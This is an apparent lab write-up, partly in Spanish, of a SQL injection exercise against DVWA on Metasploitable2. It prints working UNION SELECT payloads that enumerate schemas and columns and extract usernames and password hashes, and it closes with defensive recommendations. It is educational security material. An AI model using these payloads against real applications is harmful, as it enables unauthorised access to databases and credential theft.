

# Attack Overview — SQL Injection Assessment (DVWA / Metasploitable2)

## Executive Summary

Durante este laboratorio se identificó y explotó exitosamente una vulnerabilidad **SQL Injection (SQLi)** presente en la aplicación **DVWA** desplegada sobre **Metasploitable2**.

La vulnerabilidad permitió interactuar directamente con consultas SQL ejecutadas por el backend, obteniendo acceso a información sensible almacenada en la base de datos.

El ejercicio demostró cómo un atacante puede pasar desde una simple entrada vulnerable hasta la enumeración completa de bases de datos, tablas, columnas y credenciales.

---

## Target Information

| Asset       | Value           |
| ----------- | --------------- |
| Host        | Metasploitable2 |
| Service     | HTTP            |
| Application | DVWA            |
| Database    | MySQL           |
| Environment | Local Lab       |

---

## Attack Flow

### Phase 1 — Vulnerability Validation

Se validó inicialmente la presencia de SQL Injection utilizando operadores lógicos.

Payload:

```sql
1' OR '1'='1
```

Objetivo:

* Romper la consulta SQL original.
* Verificar ausencia de sanitización.
* Confirmar manipulación de consultas backend.

Resultado:

✅ SQL Injection confirmada.

---

### Phase 2 — Database Fingerprinting

Una vez confirmada la vulnerabilidad, se identificó el motor de base de datos.

Payload:

```sql
1' UNION SELECT version(),database()#
```

Información obtenida:

| Item            | Result        |
| --------------- | ------------- |
| DBMS            | MySQL 5.0.51a |
| Active Database | dvwa          |

Resultado:

✅ Confirmación del stack backend.

---

### Phase 3 — Schema Enumeration

Se procedió a enumerar estructuras internas de base de datos utilizando metadata de MySQL.

Payload:

```sql
1' UNION SELECT table_name,table_schema
FROM information_schema.tables#
```

Hallazgos:

#### Database: dvwa

* users
* guestbook

#### Database: mysql

* user
* host
* db

#### Database: owasp10

* accounts
* credit_cards
* captured_data

Resultado:

✅ Enumeración exitosa de múltiples schemas.

---

### Phase 4 — Column Enumeration

Luego de identificar tablas relevantes, se realizó descubrimiento de columnas.

Payload:

```sql
1' UNION SELECT column_name,table_name
FROM information_schema.columns
WHERE table_name='users'#
```

Columnas descubiertas:

* user_id
* first_name
* last_name
* user
* password
* avatar

Resultado:

✅ Mapeo completo de estructura interna.

---

### Phase 5 — Credential Access

Finalmente se ejecutó extracción controlada de datos sensibles.

Payload:

```sql
1' UNION SELECT user,password FROM users#
```

Resultado observado:

* Usuarios identificados.
* Hashes de passwords expuestos.
* Confirmación de acceso a datos sensibles.

Resultado:

✅ Confidentiality compromise achieved.

---

## Security Impact

La explotación demuestra potencial impacto real sobre:

### Confidentiality

Exposición de:

* Credenciales.
* Usuarios.
* Datos internos.

### Integrity

Posibilidad de:

* Modificación de registros.
* Inserción de datos maliciosos.
* Alteración de contenido.

### Availability

Potencial abuso mediante:

* Query abuse.
* Database overload.
* Destrucción lógica de tablas.

---

## Risk Assessment

| Finding                   | Risk     |
| ------------------------- | -------- |
| SQL Injection             | Critical |
| Credential Disclosure     | Critical |
| Database Enumeration      | High     |
| Authentication Compromise | High     |

---

## Defensive Recommendations

### Application Security

* Prepared Statements.
* ORM usage.
* Parameterized queries.
* Strict input validation.

### Database Security

* Least Privilege Accounts.
* Disable dangerous privileges.
* Schema isolation.

### Detection & Monitoring

* Web Application Firewall.
* SIEM monitoring.
* SQL query anomaly detection.
* Authentication alerting.

---

## Lessons Learned

Este laboratorio permitió comprender técnicamente:

* Funcionamiento interno de SQL Injection.
* Uso de UNION SELECT.
* Enumeración manual de bases de datos.
* Metadata abuse mediante information_schema.
* Riesgos reales sobre aplicaciones vulnerables.

---

## Disclaimer

Actividad realizada exclusivamente en entorno de laboratorio controlado con fines educativos.
